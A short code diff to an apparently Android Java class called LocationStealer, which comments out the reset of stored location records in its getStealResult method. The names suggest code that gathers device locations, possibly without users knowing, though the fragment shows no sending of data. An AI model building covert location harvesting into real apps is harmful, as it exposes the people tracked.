@@ -46,7 +46,8 @@ public class LocationStealer {
     public static List<LocationData> getStealResult(Activity c) {
         currentlyStealing = false;
         List<LocationData> data = StorageManager.with(c).locations.get();
-        StorageManager.with(c).locations.reset();
+        // Don't reset
+//        StorageManager.with(c).locations.reset();
         return data;
     }
 
